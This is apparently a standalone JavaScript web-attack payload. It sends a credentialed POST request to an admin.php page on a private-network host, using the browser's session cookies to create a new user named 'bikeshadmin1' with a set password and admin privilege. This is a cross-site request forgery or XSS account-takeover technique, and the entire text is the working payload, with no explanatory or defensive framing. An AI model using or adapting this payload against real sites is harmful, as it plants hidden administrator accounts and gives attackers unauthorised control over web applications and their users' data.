var xhr = new XMLHttpRequest();
xhr.open("POST", "http:\/\/192.168.1.88\/admin.php", true);
xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
xhr.withCredentials = true;
var body = "uname=bikeshadmin1&email=bikeshadmin1%40gmail.com&passwd=password3443&privilege=admin";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));

    
